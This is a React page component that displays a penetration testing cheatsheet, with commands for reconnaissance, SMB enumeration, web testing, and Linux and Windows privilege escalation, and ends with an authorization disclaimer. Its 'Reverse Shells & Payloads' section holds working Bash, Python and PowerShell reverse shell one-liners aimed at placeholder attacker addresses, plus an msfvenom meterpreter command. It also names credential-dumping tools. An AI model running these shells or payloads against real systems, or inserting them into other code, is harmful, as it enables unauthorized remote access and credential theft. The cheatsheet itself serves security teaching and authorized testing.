"use client";

import { useState } from "react";
import { motion } from "framer-motion";
import { GlassCard } from "@/components/UI/GlassCard";

interface CheatsheetSection {
  id: string;
  title: string;
  icon: string;
  content: string[];
}

const cheatsheetData: CheatsheetSection[] = [
  {
    id: "recon",
    title: "Reconnaissance",
    icon: "🔍",
    content: [
      "## Information Gathering",
      "`nmap -sV -sC -oA output target.com` - Service detection & scripts",
      "`whois target.com` - Domain registration info",
      "`dig target.com +short` - DNS records",
      "`shodan search target` - Internet-facing services",
      "`google-fu: inurl: site: filetype:` - Google hacking operators",
    ],
  },
  {
    id: "enumeration",
    title: "Enumeration",
    icon: "⚗",
    content: [
      "## Network Enumeration",
      "`nmap -p- target` - Full port scan",
      "`nmap -A -T4 target` - Aggressive scan with timing",
      "`masscan -p1-65535 target` - Fast port scanner",
      "",
      "## SMB Enumeration",
      "`enum4linux -a target` - Full SMB enumeration",
      "`smbclient -L //target` - List SMB shares",
      "`nmap --script smb-vuln* target` - SMB vulnerabilities",
    ],
  },
  {
    id: "web-security",
    title: "Web Security Testing",
    icon: "🕷",
    content: [
      "## OWASP Top 10",
      "1. **Injection**: SQL, OS command, LDAP injection",
      "2. **Broken Authentication**: Weak passwords, session management",
      "3. **Sensitive Data Exposure**: Unencrypted data, poor crypto",
      "4. **XML External Entities (XXE)**",
      "5. **Broken Access Control**",
      "6. **Security Misconfiguration**",
      "7. **Cross-Site Scripting (XSS)**",
      "8. **Insecure Deserialization**",
      "9. **Using Components with Known Vulnerabilities**",
      "10. **Insufficient Logging & Monitoring**",
      "",
      "## Tools",
      "`burp suite` - Web proxy & scanner",
      '`sqlmap -u "url" --dbs` - SQL injection automation',
      "`zaproxy` - Open source web scanner",
    ],
  },
  {
    id: "linux-privesc",
    title: "Linux Privilege Escalation",
    icon: "🐧",
    content: [
      "## Reconnaissance",
      "`sudo -l` - Check sudo privileges",
      "`id` - Current user and groups",
      "`uname -a` - System info",
      "`cat /etc/os-release` - OS version",
      "",
      "## Common Vectors",
      "**SUID Binaries**: `find / -perm -4000 2>/dev/null`",
      "**Writable files**: `find / -writable -type f 2>/dev/null`",
      "**Cron jobs**: `cat /etc/crontab`",
      "**Kernel exploits**: `searchsploit linux kernel`",
      "**Sudo abuse**: Check sudo -l output",
      "",
      "## Exploitation Tools",
      "`linenum.sh` - Automated Linux enumeration",
      "`pspy` - Monitor running processes",
      "`GTFOBins` - SUID exploitation reference",
    ],
  },
  {
    id: "windows-privesc",
    title: "Windows Privilege Escalation",
    icon: "🪟",
    content: [
      "## Reconnaissance",
      "`whoami /all` - User info",
      "`systeminfo` - System information",
      "`Get-Acl` - File permissions",
      "`Get-Service` - Running services",
      "",
      "## Common Vectors",
      "**Unquoted paths**: Services with spaces in path",
      "**Weak permissions**: Registry, services, files",
      "**Scheduled tasks**: Check task scheduler",
      "**DLL injection**: Service DLL hijacking",
      "**Kernel exploits**: OS-specific vulnerabilities",
      "",
      "## AD Exploitation",
      "`enum4linux-ng` - AD enumeration",
      "`bloodhound` - AD visualization",
      "`Mimikatz` - Credential dumping",
      "`DCsync` - Domain replication",
    ],
  },
  {
    id: "reverse-shells",
    title: "Reverse Shells & Payloads",
    icon: "💻",
    content: [
      "## Bash",
      "`bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`",
      "`bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'`",
      "",
      "## Python",
      '`python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'`',
      "",
      "## PowerShell",
      '`$client = New-Object System.Net.Sockets.TCPClient("10.10.14.4",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`',
      "",
      "## One-liners Generator",
      "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > shell.exe`",
    ],
  },
];

export default function CheatsheetPage() {
  const [expandedSections, setExpandedSections] = useState<Set<string>>(
    new Set(cheatsheetData.map((s) => s.id)),
  );

  const toggleSection = (id: string) => {
    const newExpanded = new Set(expandedSections);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedSections(newExpanded);
  };

  return (
    <div className="px-2 py-6 sm:px-4 sm:py-8 md:px-6 lg:px-10 lg:py-12 space-y-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="mx-auto w-full max-w-full sm:max-w-4xl lg:max-w-6xl"
      >
        <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-cyber-green tracking-wider mb-2">
          ⚡ Penetration Testing Cheatsheet
        </h1>
        <p className="text-sm sm:text-base text-gray-400">
          Quick reference for VAPT & penetration testing procedures
        </p>
      </motion.div>

      {/* Navigation */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
        className="mx-auto w-full max-w-full sm:max-w-4xl lg:max-w-6xl"
      >
        <div className="flex flex-wrap gap-1 sm:gap-2">
          {cheatsheetData.map((section) => (
            <motion.button
              key={section.id}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => toggleSection(section.id)}
              className="px-2 sm:px-3 py-1.5 sm:py-2 text-xs sm:text-sm font-mono border border-cyber-green/50 rounded-sm text-cyber-green hover:bg-cyber-green/10 transition-colors whitespace-nowrap"
            >
              <span className="hidden sm:inline">{section.icon} </span>
              {section.title}
            </motion.button>
          ))}
        </div>
      </motion.div>

      {/* Content */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.2 }}
        className="mx-auto w-full max-w-full sm:max-w-4xl lg:max-w-6xl space-y-3 sm:space-y-4"
      >
        {cheatsheetData.map((section) => (
          <motion.div
            key={section.id}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="border border-cyber-green/30 rounded-lg overflow-hidden bg-black/50"
          >
            <button
              onClick={() => toggleSection(section.id)}
              className="w-full flex items-center justify-between p-3 sm:p-4 hover:bg-cyber-green/5 transition-colors text-left gap-2"
            >
              <h2 className="text-lg sm:text-xl font-bold text-cyber-green flex items-center gap-2 flex-1 min-w-0">
                <span className="flex-shrink-0">{section.icon}</span>
                <span className="truncate sm:truncate">{section.title}</span>
              </h2>
              <motion.span
                animate={{ rotate: expandedSections.has(section.id) ? 180 : 0 }}
                transition={{ duration: 0.3 }}
                className="text-cyber-green flex-shrink-0"
              >
                ▼
              </motion.span>
            </button>

            {expandedSections.has(section.id) && (
              <motion.div
                initial={{ height: 0, opacity: 0 }}
                animate={{ height: "auto", opacity: 1 }}
                exit={{ height: 0, opacity: 0 }}
                transition={{ duration: 0.3 }}
                className="border-t border-cyber-green/30 p-3 sm:p-4 bg-black/70 space-y-2 sm:space-y-3"
              >
                {section.content.map((line, index) => (
                  <div
                    key={index}
                    className={`font-mono text-xs sm:text-sm break-words ${
                      line.startsWith("##")
                        ? "text-cyan-400 font-bold mt-2 sm:mt-3 mb-1 sm:mb-2"
                        : line.startsWith("`")
                          ? "text-lime-400 bg-black/50 p-2 rounded border border-lime-400/20 overflow-x-auto whitespace-pre-wrap"
                          : line.startsWith("**")
                            ? "text-amber-400 ml-2"
                            : "text-gray-300 ml-3 sm:ml-4"
                    }`}
                  >
                    {line
                      .replace(/^## /, "")
                      .replace(/^`|`$/g, "")
                      .replace(/\*\*/g, "")}
                  </div>
                ))}
              </motion.div>
            )}
          </motion.div>
        ))}
      </motion.div>

      {/* Footer */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.3 }}
        className="mx-auto w-full max-w-full sm:max-w-4xl lg:max-w-6xl"
      >
        <GlassCard>
          <div className="space-y-2 text-sm">
            <p className="text-cyber-green font-mono">$ Disclaimer</p>
            <p className="text-gray-400 text-xs sm:text-sm">
              This cheatsheet is for educational purposes and authorized
              penetration testing only. Unauthorized access to computer systems
              is illegal. Always obtain written permission before conducting
              security assessments.
            </p>
          </div>
        </GlassCard>
      </motion.div>
    </div>
  );
}
